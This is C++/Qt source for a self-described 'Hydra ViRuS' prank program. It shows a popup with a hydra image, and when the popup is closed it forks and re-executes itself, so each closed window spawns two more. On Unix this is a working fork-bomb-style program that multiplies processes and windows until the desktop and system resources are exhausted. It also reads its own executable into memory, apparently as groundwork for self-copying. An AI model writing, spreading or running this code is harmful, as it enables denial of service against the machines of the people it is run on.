#include <QtWidgets/QtWidgets>
#include <QtWidgets/QApplication>
#include <QtWidgets/QWidget>
#include <QtWidgets/QPushButton>
#include <QtWidgets/QBoxLayout>
#include <QtGui/QPixmap>
#include <QtGui/QScreen>
#include <ctime>
#include <iostream>
#include <fstream>

#ifdef __unix__
#include <unistd.h>
#include <signal.h>
#include <time.h>
#endif

#ifdef WIN32
#include <windows.h>
#endif

#define WIN_WIDTH 500
#define WIN_HEIGHT 150

/* XPM */
const char *hydra_xpm[] = {
/* columns rows colors chars-per-pixel */
"32 32 16 1 ",
"  c #290000",
". c #19420F",
"X c #0F7B21",
"o c #7B5220",
"O c #8C2A42",
"+ c #0DA539",
"@ c #5CBD1C",
"# c #22D659",
"$ c #B59D00",
"% c #B6CF00",
"& c #F8E800",
"* c #A57B84",
"= c #EE5B85",
"- c #EFADBE",
"; c white",
": c None",
/* pixels */
"::::::::::::::::::::::::::::::::",
"::::::::::::::::::::::::::::::::",
"::  ::::::::::::::::::::::::::::",
":: # :::::::::::::::::  ::::::::",
":: ## ::::::::::::::: # ::::::::",
":: X## ::::::::::::: +# ::::::::",
"::: X## ::::::::::: X## ::::::::",
"::: X+## :::        +# :::::::::",
":::: X+##   $&+###+..# :::::::::",
":::: XX+##.+$&%++++%&.   :::::::",
":::::  X+##.+$&&&&&&$@.+# ::::::",
"::::::: X++#.+$$....+++.X# :::::",
":::::: X++++#...####.+++.X :::::",
"::::: &X++++++++++###.+++.+ ::::",
"::::: &X++++     .X+##.+++. ::::",
":::: &X++++++       X##.+++. :::",
":::: &X+++++++X  o%o .+#.++. :::",
":::: X+.+++++++X % %   +#.+++ ::",
":::: X.+++++++++.o%o  X++#.+# ::",
":::: X.+++      X.  .XXX++#.## :",
"::::: +++++ ====        XXX++# :",
"::::: ++X ++ =OOOOO = == ..X++ :",
":::: ++X XX++ =O**o  O = ;;.X+ :",
":::: ++X XX+++ =OO*** ; ; ;   ::",
"::: ++X   XX+++ =O**** O : :::::",
"::: XX ::: XX++ ==OO---O :::::::",
":::   ::::: XX++ ==O--O== ::::::",
":::::::::::: XXXX ==OO=== ::::::",
":::::::::::::   XX ====  :::::::",
"::::::::::::::::       :::::::::",
"::::::::::::::::::::::::::::::::",
"::::::::::::::::::::::::::::::::"
};

// Since we may launch multiple times a second, we need something just a bit
// more random than std::time()
int os_get_random() {

#ifdef __unix__
  return getpid() + clock();
#endif

#ifdef WIN32
  return (GetTickCount64()%99999) + std::time(NULL);
#endif

return std::time(NULL);

}

long file_length(std::ifstream& s) {
  s.seekg(0, std::ifstream::end);
  long pos = s.tellg();
  s.seekg(0, std::ifstream::beg);
  return pos;
}

void die_and_spawn(char* exe_name) {

#ifdef __unix__
  char *args[] = {exe_name, NULL};
  fork();
  execv(exe_name, args);
#endif

#ifdef WIN32
  //TODO
#endif
  return;
}

int main(int argc, char* argv[])  {

  std::ifstream exe_stream(argv[0], std::ifstream::binary);
  //std::cout << file_length(exe_stream) << std::endl;
  long exe_length = file_length(exe_stream);
  char* exe_buffer = new char[exe_length];
  exe_stream.read(exe_buffer, exe_length);
  exe_stream.close();

  int height = 100;
  int width = 400;

  QApplication::setStyle(QStyleFactory::create("Windows"));
  QApplication app(argc, argv);
  QWidget window(NULL, Qt::Window);
  window.setWindowModality(Qt::ApplicationModal);
  window.setFixedSize(width, height);

  QBoxLayout layout(QBoxLayout::TopToBottom);
  QBoxLayout row1(QBoxLayout::LeftToRight);
  QBoxLayout row2(QBoxLayout::LeftToRight);
  layout.setSpacing(0);
  row1.setSpacing(0);
  row2.setSpacing(0);

  QLabel image(&window);
  image.setPixmap(QPixmap(hydra_xpm));
  image.move(10,10);

  QLabel text("Cut off a head, two more will take its place.\n[ Hydra ViRuS ]");
  text.setAlignment(Qt::AlignHCenter |  Qt::AlignVCenter);

  QPushButton button;
  button.setFixedSize(96, 26);
  button.setDefault(true);
  button.setText("OK");

  // Put the Window somewhere random on the desktop
  QRect screen = QApplication::desktop()->availableGeometry();
  std::srand(os_get_random());
  int spawn_x = std::rand()%(screen.width() - WIN_WIDTH);
  int spawn_y = std::rand()%(screen.height() - WIN_HEIGHT);
  window.setGeometry(spawn_x, spawn_y, WIN_WIDTH, WIN_HEIGHT);

  //row1.addWidget(&image);
  row1.addWidget(&text, Qt::AlignLeft);
  row2.addWidget(&button, Qt::AlignHCenter);
  layout.addLayout(&row1);
  layout.addLayout(&row2);

  window.show();
  window.setLayout(&layout);

  app.exec();

  die_and_spawn(argv[0]);

  return 0;
}
